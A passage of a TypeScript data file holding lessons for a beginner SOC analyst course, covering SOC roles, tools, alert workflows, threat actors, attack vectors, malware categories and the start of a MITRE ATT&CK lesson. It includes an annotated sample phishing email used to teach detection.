export interface LessonContent {
  id: string;
  courseId: string;
  title: string;
  content: string;
  keyTakeaways?: string[];
  practicalExercise?: {
    title: string;
    description: string;
    steps: string[];
  };
  additionalResources?: {
    title: string;
    url?: string;
    type: "video" | "article" | "tool" | "documentation";
  }[];
}

export const lessonContents: LessonContent[] = [
  // Module 1: Introduction to Security Operations
  {
    id: "1.1",
    courseId: "soc-fundamentals",
    title: "Welcome to the SOC",
    content: `
# Welcome to the Security Operations Center

A **Security Operations Center (SOC)** is the central hub of an organization's cybersecurity defense. It's where security professionals monitor, detect, analyze, and respond to cybersecurity incidents around the clock.

## What is a SOC?

The SOC is essentially the "nerve center" of an organization's security posture. Think of it as a 24/7 security command center where trained analysts watch over the organization's digital assets, looking for signs of malicious activity.

### Core Functions of a SOC

1. **Continuous Monitoring** - 24/7/365 surveillance of networks, endpoints, servers, and applications
2. **Threat Detection** - Identifying potential security incidents through alerts and anomalies
3. **Incident Response** - Taking action to contain and remediate security threats
4. **Threat Intelligence** - Staying informed about emerging threats and attack techniques
5. **Compliance & Reporting** - Maintaining security standards and documenting incidents

## The SOC Mission

The primary mission of a SOC is to **detect, analyze, and respond to cybersecurity incidents** using a combination of technology solutions and a strong set of processes.

> "The SOC's goal is to reduce the time between when a threat enters the environment and when it's detected and contained."

### Key Performance Metrics

| Metric | Description | Target |
|--------|-------------|--------|
| MTTD | Mean Time to Detect | < 1 hour |
| MTTR | Mean Time to Respond | < 4 hours |
| MTTC | Mean Time to Contain | < 24 hours |

## Types of SOC Models

### 1. Internal SOC
- Fully staffed and managed in-house
- Complete control over operations
- Higher cost but maximum customization

### 2. Managed SOC (MSSP)
- Outsourced to a Managed Security Service Provider
- Cost-effective for smaller organizations
- 24/7 coverage without internal staffing challenges

### 3. Hybrid SOC
- Combination of internal team and external services
- Internal team handles critical functions
- MSSP provides overflow and off-hours coverage

## Your Role as a SOC Analyst

As a Level 1 SOC Analyst, you are the **first line of defense**. Your responsibilities include:

- Monitoring security alerts and dashboards
- Performing initial triage of security events
- Documenting and escalating incidents
- Following established procedures and runbooks
- Maintaining situational awareness

### The Analyst Mindset

Successful SOC analysts share these characteristics:

- **Curiosity** - Always asking "why" and digging deeper
- **Attention to Detail** - Small anomalies can indicate big threats
- **Calm Under Pressure** - Incidents require clear thinking
- **Continuous Learning** - The threat landscape constantly evolves
- **Team Collaboration** - Security is a team sport
    `,
    keyTakeaways: [
      "A SOC is the central hub for monitoring and responding to security threats",
      "Core functions include monitoring, detection, response, and threat intelligence",
      "MTTD, MTTR, and MTTC are key metrics for measuring SOC effectiveness",
      "As a L1 analyst, you're the first line of defense in threat detection",
      "The analyst mindset requires curiosity, attention to detail, and continuous learning"
    ],
    additionalResources: [
      { title: "SANS SOC Survey Report", type: "article" },
      { title: "Building a SOC - NIST Guidelines", type: "documentation" },
    ]
  },
  {
    id: "1.2",
    courseId: "soc-fundamentals",
    title: "SOC Team Roles & Responsibilities",
    content: `
# SOC Team Roles & Responsibilities

A well-functioning SOC requires a diverse team with clearly defined roles. Understanding these roles helps you know who to escalate to and what career path you might pursue.

## SOC Team Hierarchy

\`\`\`
                    ┌─────────────────┐
                    │   SOC Manager   │
                    └────────┬────────┘
                             │
              ┌──────────────┴──────────────┐
              │                             │
      ┌───────┴───────┐           ┌─────────┴─────────┐
      │  L3 Analyst   │           │  Threat Hunter    │
      │  (SME/Lead)   │           │                   │
      └───────┬───────┘           └───────────────────┘
              │
      ┌───────┴───────┐
      │  L2 Analyst   │
      │  (Incident    │
      │   Handler)    │
      └───────┬───────┘
              │
      ┌───────┴───────┐
      │  L1 Analyst   │
      │  (Triage)     │
      └───────────────┘
\`\`\`

## Tier 1: SOC Analyst (Triage Specialist)

**You are here!** As a Tier 1 analyst, you're on the front lines.

### Daily Responsibilities:
- Monitor SIEM dashboards and alert queues
- Perform initial alert triage (true positive vs false positive)
- Document findings in ticketing systems
- Escalate confirmed incidents to Tier 2
- Follow standard operating procedures (SOPs)
- Maintain shift logs and handover notes

### Required Skills:
- Basic understanding of networking (TCP/IP, DNS, HTTP)
- Familiarity with common attack patterns
- Ability to read and interpret logs
- Strong documentation skills
- Time management and prioritization

### Typical Day:
| Time | Activity |
|------|----------|
| 0800 | Shift handover, review overnight alerts |
| 0830 | Begin alert queue processing |
| 1000 | Document and escalate high-priority alert |
| 1200 | Lunch break |
| 1300 | Continue monitoring and triage |
| 1500 | Update ticket documentation |
| 1600 | Prepare shift handover notes |

## Tier 2: Incident Responder

When you escalate an incident, Tier 2 takes over.

### Responsibilities:
- Deep-dive investigation of escalated alerts
- Correlation of events across multiple data sources
- Containment actions (blocking IPs, isolating hosts)
- Malware analysis and IOC extraction
- Communication with affected teams
- Incident documentation and timeline creation

### Skills Required:
- Advanced log analysis
- Memory and disk forensics basics
- Scripting (Python, PowerShell)
- Understanding of attack frameworks (MITRE ATT&CK)

## Tier 3: Senior Analyst / Threat Hunter

The experts who handle the most complex cases.

### Responsibilities:
- Complex incident investigations
- Proactive threat hunting
- Detection rule development
- Mentoring junior analysts
- Security tool optimization
- Threat intelligence analysis

## SOC Manager

Oversees the entire SOC operation.

### Responsibilities:
- Team management and scheduling
- Budget and resource allocation
- Stakeholder communication
- Strategy and roadmap development
- Metrics tracking and reporting
- Hiring and training

## Supporting Roles

### Threat Intelligence Analyst
- Gathers and analyzes threat intelligence
- Creates IOC feeds for detection
- Produces threat briefings

### Detection Engineer
- Develops and tunes detection rules
- Reduces false positives
- Improves detection coverage

### Security Engineer
- Maintains SOC tools and infrastructure
- Integrates new data sources
- Automates workflows

## Career Progression

\`\`\`
L1 Analyst → L2 Analyst → L3 Analyst → SOC Manager
                ↓              ↓
         Threat Hunter    Detection Engineer
                ↓              ↓
           IR Lead        Security Architect
\`\`\`

The average time to progress from L1 to L2 is 1-2 years with continuous learning and experience.
    `,
    keyTakeaways: [
      "SOCs follow a tiered structure (L1, L2, L3) with increasing responsibility",
      "L1 analysts focus on triage, monitoring, and initial investigation",
      "L2 analysts handle deeper investigation and containment",
      "L3 analysts are experts in threat hunting and complex incidents",
      "Career paths can lead to management, hunting, or engineering roles"
    ],
    practicalExercise: {
      title: "Role Mapping Exercise",
      description: "Match scenarios to the appropriate SOC role that should handle them.",
      steps: [
        "Review the following scenarios",
        "Identify which SOC role should handle each",
        "Explain your reasoning for each decision"
      ]
    }
  },
  {
    id: "1.3",
    courseId: "soc-fundamentals",
    title: "SOC Tools & Technologies Overview",
    content: `
# SOC Tools & Technologies Overview

Modern SOCs rely on a variety of tools to detect, investigate, and respond to threats. Understanding these tools is essential for your success as an analyst.

## The SOC Technology Stack

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    SOAR (Automation)                        │
├─────────────────────────────────────────────────────────────┤
│     SIEM      │    TIP       │     Case      │    ITSM     │
│  (Detection)  │  (Intel)     │  Management   │  (Tickets)  │
├───────────────┴──────────────┴───────────────┴─────────────┤
│  EDR  │  NDR  │  Firewall  │  Email  │  Cloud  │   IAM     │
│       │       │   Logs     │  Logs   │  Logs   │   Logs    │
├─────────────────────────────────────────────────────────────┤
│                    Log Collection & SIEM                    │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Core Technologies

### 1. SIEM (Security Information and Event Management)

The **heart of the SOC**. SIEM aggregates logs from across the environment and provides alerting, correlation, and search capabilities.

**Popular SIEM Platforms:**
| Platform | Type | Key Features |
|----------|------|--------------|
| Splunk | Commercial | Powerful search, extensive apps |
| Microsoft Sentinel | Cloud | Azure integration, AI/ML |
| Elastic SIEM | Open Source | Scalable, flexible |
| IBM QRadar | Commercial | Strong correlation engine |
| Google Chronicle | Cloud | Petabyte-scale, fast search |

**What You'll Do in SIEM:**
- Review alert queues
- Run searches to investigate events
- Create dashboards and reports
- Correlate events across sources

### 2. EDR (Endpoint Detection and Response)

Provides visibility into endpoint activity and enables response actions.

**Key Capabilities:**
- Process monitoring
- File system monitoring
- Network connection tracking
- Behavioral detection
- Remote containment

**Popular EDR Solutions:**
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- Carbon Black
- SentinelOne
- Cortex XDR

**What You'll Do in EDR:**
- Investigate endpoint alerts
- Review process trees
- Analyze suspicious files
- Isolate compromised systems

### 3. NDR (Network Detection and Response)

Monitors network traffic for threats and anomalies.

**Key Capabilities:**
- Traffic analysis
- Protocol inspection
- Threat detection
- Network forensics

**What You'll See:**
- Command and control (C2) traffic
- Data exfiltration attempts
- Lateral movement
- Unusual connections

### 4. Firewall & Network Logs

Essential data sources for understanding network activity.

**Key Log Types:**
- **Firewall logs**: Allow/deny decisions, source/dest IPs
- **Proxy logs**: Web traffic, URLs, user agents
- **DNS logs**: Domain lookups, potential DGA
- **VPN logs**: Remote access activity

### 5. Threat Intelligence Platform (TIP)

Aggregates and operationalizes threat intelligence.

**Functions:**
- IOC management
- Feed aggregation
- Intelligence enrichment
- Sharing and collaboration

**Popular TIPs:**
- MISP (Open Source)
- ThreatConnect
- Anomali
- Recorded Future

### 6. SOAR (Security Orchestration, Automation, and Response)

Automates repetitive tasks and orchestrates response workflows.

**Use Cases:**
- Automatic IOC enrichment
- Phishing response automation
- Alert triage automation
- Playbook execution

**Popular SOAR Platforms:**
- Splunk SOAR (Phantom)
- Palo Alto Cortex XSOAR
- IBM Resilient
- Swimlane

## How Tools Work Together

\`\`\`
[Endpoint] → [EDR] ──┐
                     │
[Network] → [NDR] ───┼──→ [SIEM] ──→ [Alert] ──→ [Analyst]
                     │         │                     │
[Firewall] ──────────┘         │                     ↓
                               ↓              [Investigation]
                            [SOAR] ←──────────→ [Response]
                               │
                               ↓
                            [TIP]
\`\`\`

## Tool Access for L1 Analysts

As a L1 analyst, you'll primarily interact with:

1. **SIEM** - Your main dashboard for alerts and searches
2. **EDR Console** - For endpoint investigations
3. **Ticketing System** - For documentation
4. **TIP/OSINT Tools** - For enrichment

More advanced tools (forensics, malware analysis) are typically used by L2+ analysts.
    `,
    keyTakeaways: [
      "SIEM is the central platform for log aggregation and alerting",
      "EDR provides visibility and response capabilities on endpoints",
      "NDR monitors network traffic for threats",
      "SOAR automates repetitive tasks and response workflows",
      "L1 analysts primarily use SIEM, EDR console, and ticketing systems"
    ],
    additionalResources: [
      { title: "Splunk Fundamentals 1", type: "documentation", url: "https://www.splunk.com/en_us/training/courses/splunk-fundamentals-1.html" },
      { title: "MITRE ATT&CK Navigator", type: "tool", url: "https://mitre-attack.github.io/attack-navigator/" }
    ]
  },
  {
    id: "1.4",
    courseId: "soc-fundamentals",
    title: "SOC Workflows & Shift Handover",
    content: `
# SOC Workflows & Shift Handover

Effective SOC operations depend on well-defined workflows and seamless shift transitions. This lesson covers the essential processes that keep a SOC running smoothly.

## The Alert Lifecycle

Every security alert follows a lifecycle from generation to closure:

\`\`\`
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  Alert   │ → │  Triage  │ → │ Analyze  │ → │ Respond  │ → │  Close   │
│ Generated│   │          │   │          │   │          │   │          │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
     ↓              ↓              ↓              ↓              ↓
  Detection    L1 Review     Investigation   Containment    Document
   Rules       & Priority    & Enrichment    & Recovery    & Lessons
\`\`\`

## Alert Triage Workflow

### Step 1: Initial Assessment
- Review alert details (type, severity, source)
- Check for related alerts
- Gather initial context

### Step 2: Quick Wins Check
\`\`\`
□ Known false positive?
□ Scheduled maintenance window?
□ Expected activity (scan, pentest)?
□ Duplicate of existing ticket?
\`\`\`

### Step 3: Investigation
- Enrich IOCs (IP, hash, domain)
- Review related logs
- Check affected assets

### Step 4: Decision
- **False Positive** → Document and close
- **True Positive** → Escalate to L2
- **Needs More Info** → Continue investigation

## Ticketing & Documentation

Every alert interaction must be documented. Good documentation:

### Ticket Structure
\`\`\`markdown
## Alert Summary
- Alert Name: [Detection Name]
- Severity: [Critical/High/Medium/Low]
- Time: [Timestamp]
- Affected Asset: [Hostname/IP]

## Initial Findings
[What you observed during triage]

## Investigation Steps
1. [Action taken]
2. [Action taken]
3. [Action taken]

## Conclusion
[True Positive / False Positive / Needs Escalation]

## Recommendations
[If applicable]
\`\`\`

### Documentation Best Practices
- Be specific and factual
- Include timestamps
- Reference evidence (screenshots, log entries)
- Avoid jargon unless necessary
- Write for the next analyst who reviews this

## Escalation Procedures

### When to Escalate

**Immediate Escalation Required:**
- Confirmed malware execution
- Active data exfiltration
- Ransomware indicators
- Compromised privileged account
- Critical system affected

**Escalate After Initial Triage:**
- Complex investigation needed
- Multiple systems affected
- Unknown malware
- Insider threat indicators

### Escalation Checklist
\`\`\`
□ Document all findings so far
□ Preserve relevant evidence
□ Identify affected systems and users
□ Note any containment actions taken
□ Provide timeline of events
□ Include all IOCs discovered
\`\`\`

## Shift Handover Process

Smooth shift transitions are critical for 24/7 operations.

### Pre-Handover (Outgoing Shift)
1. Review all open tickets
2. Document current status of ongoing incidents
3. Note any pending actions
4. Prepare handover summary

### Handover Meeting (15-30 minutes)
\`\`\`
1. Shift Summary
   - Total alerts processed
   - Incidents opened/closed
   - Major events

2. Active Incidents
   - Current status
   - Actions taken
   - Pending tasks

3. Items Requiring Attention
   - High-priority tickets
   - Awaiting responses
   - Escalated issues

4. Situational Awareness
   - Known threats/campaigns
   - Scheduled activities
   - Infrastructure issues

5. Questions & Clarifications
\`\`\`

### Handover Documentation Template
\`\`\`markdown
# Shift Handover - [Date] [Shift Time]

## Shift Statistics
- Alerts Reviewed: XX
- Tickets Created: XX
- Incidents Escalated: XX

## Active Incidents
| Ticket # | Description | Status | Next Action |
|----------|-------------|--------|-------------|
| INC-001  | Malware     | Active | Awaiting IR |
| INC-002  | Phishing    | Open   | User follow-up |

## Pending Items
- [ ] Follow up on ticket INC-001
- [ ] Review false positive feedback

## Notes
[Any additional context for incoming shift]

## Handover Completed By
Outgoing: [Name] | Incoming: [Name]
\`\`\`

## Communication Channels

### Internal Communication
- **Chat/Slack**: Quick questions, real-time collaboration
- **Ticketing System**: Formal documentation
- **Email**: Non-urgent notifications
- **Phone/Bridge**: Critical incidents

### External Communication
All external communication should go through proper channels:
- SOC Manager for media/executives
- Legal for law enforcement
- PR for public statements
    `,
    keyTakeaways: [
      "Alerts follow a lifecycle: Detection → Triage → Analysis → Response → Closure",
      "Every action must be documented in the ticketing system",
      "Know when to escalate: malware execution, data exfiltration, privileged account compromise",
      "Shift handovers ensure continuity and prevent dropped incidents",
      "Use standardized templates for consistent documentation"
    ],
    practicalExercise: {
      title: "Handover Documentation",
      description: "Practice creating a shift handover document based on a scenario.",
      steps: [
        "Review the provided scenario details",
        "Create a handover document using the template",
        "Include all active incidents and pending items",
        "Identify any high-priority items for the next shift"
      ]
    }
  },
  // Module 2: Cyber Threat Landscape
  {
    id: "2.1",
    courseId: "soc-fundamentals",
    title: "Understanding Threat Actors",
    content: `
# Understanding Threat Actors

To defend effectively, you must understand who you're defending against. Threat actors vary widely in their motivations, capabilities, and methods.

## What is a Threat Actor?

A **threat actor** is any individual, group, or organization that attempts to exploit vulnerabilities in systems, networks, or people to achieve malicious objectives.

## Categories of Threat Actors

### 1. Nation-State Actors (APT)

**Also known as:** Advanced Persistent Threats (APTs)

**Characteristics:**
- State-sponsored or state-affiliated
- Extremely well-resourced
- Highly sophisticated techniques
- Long-term, persistent operations
- Specific geopolitical objectives

**Motivations:**
- Espionage (political, military, economic)
- Critical infrastructure disruption
- Influence operations

**Examples:**
| APT Group | Nation | Known Targets |
|-----------|--------|---------------|
| APT29 (Cozy Bear) | Russia | Government, Think Tanks |
| APT41 | China | Technology, Healthcare |
| Lazarus Group | North Korea | Financial, Crypto |
| APT33 | Iran | Energy, Aviation |

**TTPs (Tactics, Techniques, Procedures):**
- Custom malware
- Zero-day exploits
- Supply chain attacks
- Living off the land

### 2. Cybercriminals

**Characteristics:**
- Financially motivated
- Range from individuals to organized groups
- Use commodity malware and toolkits
- Opportunistic or targeted

**Common Activities:**
- Ransomware attacks
- Business Email Compromise (BEC)
- Credential theft and sale
- Banking trojans
- Cryptomining

**Notable Groups:**
- REvil (Ransomware)
- FIN7 (Financial Crime)
- Conti (Ransomware-as-a-Service)

### 3. Hacktivists

**Characteristics:**
- Ideologically motivated
- Seek publicity for causes
- Variable skill levels
- Often decentralized

**Motivations:**
- Political protest
- Social causes
- Anti-corporate sentiment
- Environmental activism

**Common Tactics:**
- Website defacement
- DDoS attacks
- Data leaks (doxxing)
- Social media hijacking

**Notable Groups:**
- Anonymous
- LulzSec (historical)

### 4. Insider Threats

**Types:**
- **Malicious Insiders**: Intentional harm
- **Negligent Insiders**: Accidental exposure
- **Compromised Insiders**: Account taken over

**Warning Signs:**
- Unusual access patterns
- Large data downloads
- After-hours activity
- Accessing unneeded resources
- Disgruntled behavior

**Why Dangerous:**
- Legitimate access
- Knowledge of systems
- Trusted by security controls

### 5. Script Kiddies

**Characteristics:**
- Low skill level
- Use pre-built tools
- Opportunistic targets
- Seek recognition

**Common Activities:**
- Running exploit scripts
- Website defacement
- DDoS using botnets
- Social media hacking

## Threat Actor Comparison

| Attribute | Nation-State | Cybercriminal | Hacktivist | Insider |
|-----------|--------------|---------------|------------|---------|
| Motivation | Espionage | Financial | Ideological | Varies |
| Skill Level | High | Medium-High | Low-Medium | Varies |
| Resources | Extensive | Moderate | Limited | Varies |
| Persistence | Very High | Medium | Low | Medium |
| Stealth | Very High | Medium | Low | High |

## Understanding Motivations: The Diamond Model

The Diamond Model helps analyze threats:

\`\`\`
                 Adversary
                    ↑
                    │
    Capability ←────┼────→ Infrastructure
                    │
                    ↓
                  Victim
\`\`\`

- **Adversary**: Who is attacking?
- **Capability**: What tools/techniques?
- **Infrastructure**: What systems are used?
- **Victim**: Who is targeted?

## Why This Matters for SOC Analysts

Understanding threat actors helps you:

1. **Prioritize alerts** based on likely adversary
2. **Recognize patterns** in attack behavior
3. **Anticipate next steps** in an attack
4. **Apply appropriate response** measures
5. **Communicate effectively** about threats
    `,
    keyTakeaways: [
      "Nation-state actors are highly sophisticated with geopolitical motivations",
      "Cybercriminals are financially motivated and use ransomware, BEC, and malware",
      "Hacktivists are ideologically driven and seek publicity",
      "Insider threats are dangerous due to legitimate access and system knowledge",
      "Understanding motivations helps prioritize and respond to threats"
    ]
  },
  {
    id: "2.2",
    courseId: "soc-fundamentals",
    title: "Common Attack Vectors",
    content: `
# Common Attack Vectors

An **attack vector** is the path or method an attacker uses to gain access to a target system. Understanding these vectors helps you recognize attacks in progress.

## The Attack Surface

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                      YOUR ORGANIZATION                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │  Email   │  │   Web    │  │ Network  │  │  People  │        │
│  │ Gateway  │  │  Apps    │  │  Edge    │  │          │        │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘        │
│       │             │             │             │               │
│       └─────────────┴─────────────┴─────────────┘               │
│                           ↑                                     │
│                    ATTACK SURFACE                               │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## 1. Phishing & Social Engineering

**The most common initial access vector.** Over 90% of successful attacks start with phishing.

### Types of Phishing

| Type | Description | Example |
|------|-------------|---------|
| **Spear Phishing** | Targeted at specific individuals | CFO receives fake invoice |
| **Whaling** | Targets executives | CEO impersonation |
| **Smishing** | SMS-based phishing | Fake delivery notification |
| **Vishing** | Voice/phone phishing | IT support scam call |
| **Business Email Compromise** | Compromised/spoofed business email | Wire transfer fraud |

### Phishing Indicators

**Email Headers:**
- Sender domain doesn't match company
- Reply-to differs from sender
- Unusual routing

**Content:**
- Urgency or threats
- Grammar/spelling errors
- Generic greetings
- Suspicious links
- Unexpected attachments

**Technical:**
- URL doesn't match display text
- Attachment with macros
- Password-protected archives

### Example Phishing Analysis
\`\`\`
From: support@micros0ft.com ← Typosquatting
Reply-To: claims@gmail.com ← External reply-to
Subject: Urgent: Your account will be suspended!

Dear Customer, ← Generic greeting

Your Microsoft account has been compromised. Click here 
to verify your identity immediately or your account 
will be permanently deleted within 24 hours.

[Verify Now] ← Links to: http://microsoft-verify.suspicious.com/login

Thank you,
Microsoft Support Team
\`\`\`

## 2. Malware Delivery

### Delivery Methods

**Email Attachments:**
- Office documents with macros
- PDF with embedded scripts
- ZIP files (often password-protected)
- HTML attachments

**Web-Based:**
- Drive-by downloads
- Watering hole attacks
- Malvertising
- Compromised legitimate sites

**Removable Media:**
- USB drops
- Infected software on CDs

### Common Malware Types

| Type | Purpose | Example |
|------|---------|---------|
| Dropper | Delivers other malware | Emotet |
| RAT | Remote access | Cobalt Strike |
| Ransomware | Encrypt and extort | LockBit |
| Infostealer | Steal credentials | RedLine |
| Cryptominer | Mine cryptocurrency | XMRig |

## 3. Exploitation

### Vulnerability Types

**Remote Code Execution (RCE):**
- Most dangerous vulnerability type
- Allows running code on remote system
- Examples: Log4Shell, EternalBlue

**Privilege Escalation:**
- Elevate from user to admin
- Critical for lateral movement

**SQL Injection:**
- Inject SQL commands
- Access/modify databases

**Cross-Site Scripting (XSS):**
- Inject malicious scripts
- Steal session cookies

### Exploitation Lifecycle
\`\`\`
1. Reconnaissance → Find vulnerable systems
2. Weaponization → Create exploit
3. Delivery → Send exploit to target
4. Exploitation → Trigger vulnerability
5. Installation → Drop payload
6. Command & Control → Establish C2
7. Actions on Objectives → Achieve goals
\`\`\`

## 4. Credential Attacks

### Password Attacks

**Brute Force:**
- Try all possible combinations
- Slow but thorough

**Dictionary Attack:**
- Try common passwords
- Faster than brute force

**Password Spraying:**
- Try few passwords against many accounts
- Avoids account lockouts

**Credential Stuffing:**
- Use leaked credentials
- Exploit password reuse

### Detection Indicators

- Multiple failed login attempts
- Logins from unusual locations
- After-hours authentication
- Impossible travel (logins from distant locations)

## 5. Supply Chain Attacks

Attack the vendor to reach the target.

### Examples:
- **SolarWinds (2020)**: Malicious update to Orion
- **Kaseya (2021)**: MSP software compromise
- **3CX (2023)**: VoIP software supply chain

### Indicators:
- Unusual behavior from trusted software
- Unexpected network connections
- Signed but malicious code
    `,
    keyTakeaways: [
      "Phishing is the most common initial access vector (90%+ of attacks)",
      "Look for typosquatting, urgency, mismatched links in phishing emails",
      "Malware is delivered via email attachments, web downloads, and removable media",
      "Credential attacks include brute force, password spraying, and credential stuffing",
      "Supply chain attacks target trusted vendors to reach the ultimate target"
    ],
    practicalExercise: {
      title: "Phishing Email Analysis",
      description: "Analyze sample phishing emails and identify all suspicious indicators.",
      steps: [
        "Review the provided email samples",
        "Identify sender, header, and content red flags",
        "Extract any IOCs (domains, URLs, attachment hashes)",
        "Classify the type of phishing attack",
        "Recommend user awareness improvements"
      ]
    }
  },
  {
    id: "2.3",
    courseId: "soc-fundamentals",
    title: "Malware Categories & Behavior",
    content: `
# Malware Categories & Behavior

Understanding malware categories and their behaviors is crucial for effective detection and response. Each type exhibits distinct characteristics that help analysts identify and contain threats.

## What is Malware?

**Malware** (malicious software) is any program designed to harm, exploit, or compromise computer systems, networks, or users. It ranges from simple scripts to sophisticated nation-state tools.

## Malware Classification Framework

\`\`\`
┌────────────────────────────────────────────────────────────┐
│                    MALWARE TAXONOMY                        │
├────────────────┬───────────────────┬───────────────────────┤
│   BY VECTOR    │   BY BEHAVIOR     │    BY PURPOSE         │
├────────────────┼───────────────────┼───────────────────────┤
│ • Virus        │ • Self-replicating│ • Financial gain      │
│ • Worm         │ • Persistent      │ • Espionage           │
│ • Trojan       │ • Stealthy        │ • Destruction         │
│ • Dropper      │ • Polymorphic     │ • Access maintenance  │
└────────────────┴───────────────────┴───────────────────────┘
\`\`\`

## Major Malware Categories

### 1. Viruses

**Characteristics:**
- Requires host file to spread
- Activates when host program runs
- Self-replicates by infecting other files
- Legacy threat, less common today

**Types:**
| Virus Type | Target | Behavior |
|------------|--------|----------|
| File Infector | Executables | Attaches to .exe/.dll files |
| Boot Sector | MBR/VBR | Infects boot process |
| Macro Virus | Documents | Embeds in Office macros |
| Polymorphic | Various | Changes code signature |

### 2. Worms

**Characteristics:**
- Self-replicating without host file
- Spreads across networks autonomously
- Exploits vulnerabilities for propagation
- Can cause network congestion

**Famous Examples:**
- **WannaCry (2017)**: Exploited EternalBlue, encrypted files
- **Conficker (2008)**: Infected millions of systems
- **Slammer (2003)**: Spread in 10 minutes globally

**Detection Indicators:**
- Unusual network scanning
- High bandwidth consumption
- Multiple systems showing same behavior
- Exploitation attempts on same vulnerability

### 3. Trojans

**Characteristics:**
- Disguises as legitimate software
- Doesn't self-replicate
- Requires user action to install
- Creates backdoor for attackers

**Trojan Types:**
| Type | Function |
|------|----------|
| RAT (Remote Access Trojan) | Full remote control |
| Banking Trojan | Steals financial credentials |
| Downloader | Fetches additional malware |
| Infostealer | Harvests sensitive data |
| Backdoor | Maintains persistent access |

### 4. Ransomware

**Characteristics:**
- Encrypts files or locks systems
- Demands payment for decryption
- Often includes data exfiltration
- Uses strong encryption (AES-256, RSA)

**Ransomware Evolution:**
\`\`\`
Generation 1: Encrypt files → Demand ransom
Generation 2: Encrypt + Exfiltrate → Double extortion
Generation 3: Encrypt + Exfiltrate + DDoS → Triple extortion
\`\`\`

**Notable Families:**
- **LockBit**: Most active RaaS operation
- **BlackCat/ALPHV**: Rust-based, sophisticated
- **Cl0p**: Known for MOVEit exploitation
- **Royal**: Targets critical infrastructure

**Ransomware Indicators:**
- Mass file modifications
- Ransom notes appearing
- File extension changes (.encrypted, .locked)
- Shadow copy deletion
- Encryption key generation

### 5. Rootkits

**Characteristics:**
- Hides deep in the system
- Modifies OS components
- Extremely difficult to detect
- Survives reboots

**Types:**
| Level | Location | Detection Difficulty |
|-------|----------|---------------------|
| User-mode | Applications | Moderate |
| Kernel-mode | OS kernel | High |
| Bootkit | Boot process | Very High |
| Firmware | BIOS/UEFI | Extreme |

### 6. Spyware & Infostealers

**Targeted Data:**
- Browser credentials
- Cryptocurrency wallets
- Session cookies
- Keystrokes
- Screenshots
- Clipboard contents

**Popular Infostealers:**
- **RedLine**: Most widespread, sold as MaaS
- **Raccoon**: Steals browser data
- **Vidar**: Targets crypto wallets
- **FormBook**: Keylogger and form grabber

### 7. Botnets

**Characteristics:**
- Network of compromised systems
- Centralized or P2P control
- Used for DDoS, spam, mining
- Difficult to completely eliminate

**Botnet Architecture:**
\`\`\`
           ┌──────────────┐
           │   C2 Server  │
           └──────┬───────┘
                  │
    ┌─────────────┼─────────────┐
    ↓             ↓             ↓
┌───────┐    ┌───────┐    ┌───────┐
│ Bot 1 │    │ Bot 2 │    │ Bot N │
└───────┘    └───────┘    └───────┘
\`\`\`

## Malware Behavior Patterns

### Persistence Mechanisms
- Registry Run keys
- Scheduled tasks
- Services
- Startup folders
- WMI subscriptions
- DLL hijacking

### Evasion Techniques
- Process injection
- Code obfuscation
- Anti-debugging
- Sandbox detection
- Fileless execution
- Living off the land

### Command & Control (C2)
- HTTP/HTTPS beaconing
- DNS tunneling
- Social media channels
- Cloud services
- Domain fronting
    `,
    keyTakeaways: [
      "Viruses require host files while worms spread autonomously across networks",
      "Trojans disguise as legitimate software and often create backdoors",
      "Ransomware has evolved to include data theft and multiple extortion tactics",
      "Rootkits hide deep in systems and are extremely difficult to detect",
      "Understanding persistence and evasion techniques helps identify infections"
    ],
    additionalResources: [
      { title: "MITRE ATT&CK Malware", type: "documentation" },
      { title: "Any.Run Malware Sandbox", type: "tool" }
    ]
  },
  {
    id: "2.4",
    courseId: "soc-fundamentals",
    title: "Introduction to MITRE ATT&CK",
    content: `
# Introduction to MITRE ATT&CK

The MITRE ATT&CK framework is the industry standard for understanding adversary behavior. As a SOC analyst, this framework will be your guide for understanding and categorizing attacks.

## What is MITRE ATT&CK?

**ATT&CK** stands for **A**dversarial **T**actics, **T**echniques, and **C**ommon **K**nowledge. It's a globally-accessible knowledge base of adversary behavior based on real-world observations.

> "ATT&CK is a curated knowledge base and model for cyber adversary behavior."

## Why ATT&CK Matters

### For SOC Analysts:
- **Common Language**: Standardized terminology for attacks
- **Detection Mapping**: Link alerts to specific techniques
- **Gap Analysis**: Identify coverage weaknesses
- **Investigation Guide**: Understand attack progression

### For Organizations:
- Threat modeling
- Red team planning
- Security assessment
- Vendor evaluation

## ATT&CK Matrix Structure

\`\`\`
┌─────────────────────────────────────────────────────────────────────┐
│                         ATT&CK MATRIX                                │
├─────────────┬──────────────┬────────────────┬──────────────────────┤
│ Tactic      │ Tactic       │ Tactic         │ Tactic               │
│ (WHY)       │ (WHY)        │ (WHY)          │ (WHY)                │
├─────────────┼──────────────┼────────────────┼──────────────────────┤
│ Technique   │ Technique    │ Technique      │ Technique            │
│ (HOW)       │ (HOW)        │ (HOW)          │ (HOW)                │
├─────────────┼──────────────┼────────────────┼──────────────────────┤
│ Technique   │ Technique    │ Technique      │ Technique            │
├─────────────┼──────────────┼────────────────┼──────────────────────┤
│ Sub-tech    │ Sub-tech     │ Sub-tech       │ Sub-tech             │
└─────────────┴──────────────┴────────────────┴──────────────────────┘
\`\`\`

## The 14 Tactics

Tactics represent the **"why"** - the adversary's goal at each stage:

| # | Tactic | Description |
|---|--------|-------------|
| 1 | **Reconnaissance** | Gathering information about target |
| 2 | **Resource Development** | Building attack infrastructure |
| 3 | **Initial Access** | Getting into the network |
| 4 | **Execution** | Running malicious code |
| 5 | **Persistence** | Maintaining foothold |
| 6 | **Privilege Escalation** | Getting higher permissions |
| 7 | **Defense Evasion** | Avoiding detection |
| 8 | **Credential Access** | Stealing passwords/tokens |
| 9 | **Discovery** | Learning about the environment |
| 10 | **Lateral Movement** | Moving through network |
| 11 | **Collection** | Gathering target data |
| 12 | **Command & Control** | Communicating with implants |
| 13 | **Exfiltration** | Stealing data out |
| 14 | **Impact** | Disrupting or destroying |

## Techniques and Sub-Techniques

